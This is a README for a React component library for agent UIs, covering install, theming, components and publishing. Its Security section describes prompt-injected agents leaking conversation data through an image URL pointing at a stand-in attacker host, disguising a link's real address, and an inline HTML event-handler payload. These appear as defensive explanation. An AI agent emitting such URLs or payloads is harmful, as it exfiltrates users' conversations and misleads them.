[한국어](https://github.com/dusunax/design/blob/main/packages/moa/README.md) | English

# @dusunax/moa

Lightweight React components for agent UIs. The name comes from the Korean "모아" (moa, "gather"): gather small components to build a screen.

## Install

```bash
pnpm add @dusunax/moa
```

Requires React 19 (`react` and `react-dom` are peer dependencies).

## Usage

Styles ship as a single compiled CSS file. Import it once in your app. You don't need Tailwind, and it doesn't change your page's global styles.

```tsx
import "@dusunax/moa/styles.css";
import { Button, Text } from "@dusunax/moa";

export function Example() {
  return (
    <div data-moa-theme="dark">
      <Text text="**Hello**, moa" />
      <Button onClick={() => {}}>OK</Button>
    </div>
  );
}
```

- For the dark theme, add `data-moa-theme="dark"` to a wrapping element. Components rendered in a portal, like Modal, follow the theme near their trigger.
- To import a single component, use its subpath (`@dusunax/moa/button`, `@dusunax/moa/tool-call-card`).
- Built-in UI text (`Close`, `No results`, `Running`, and so on) is in English. There is no translation dictionary. Change the text with props like `labels` and `emptyText`.

## Components

| Group | Components |
|---|---|
| Layout and display | Row, Column, List, Card, Divider, Text, Image, Icon |
| Input | Button, TextField, CheckBox, DateTimeInput |
| Behavior handled by Radix | Modal, Tabs, Slider, ChoicePicker |
| Agent | MessageBubble, StreamingText, RunStatus, ToolCallCard |

Component names, prop names, and variant values match the A2UI basic catalog. This package is not an official A2UI or AG-UI implementation.

## Security

The strings and URLs a component renders may come from an agent. An agent hit by prompt injection can target users through these paths:

- **Data leaks through URLs**: Image loads the URL it receives right away. If an agent passes a URL like `https://attacker.example/?q=<conversation>`, the browser sends the request without the user clicking anything. Text links work the same way but need a click.
- **Link text that differs from the real address**: A link can show one address and go to another, like `[https://bank.example](https://attacker.example)`. On touch devices there is no way to preview the real address.

`moa` renders components and does not block these paths. In apps that render agent output:

- Restrict image sources with a CSP `img-src`.
- Filter Image `url` and Text link addresses through an origin allowlist before passing them in.

What `moa` does block:

- Text does not interpret HTML. `<img onerror=…>` shows up as plain text.
- Text only turns `http:`, `https:`, and `mailto:` addresses into links, and adds `rel="noopener noreferrer"` when opening a new tab.
- All string props render as text, escaped by React.

## Publishing

A maintainer publishes locally with an npm account 2FA OTP. CI holds no publish token.

```bash
pnpm changeset   # add a change entry
pnpm changeset version
pnpm release     # build, then npm publish with an OTP
```

## License

MIT. Icon SVG paths come from [Material Symbols](https://github.com/google/material-design-icons) (Apache-2.0).
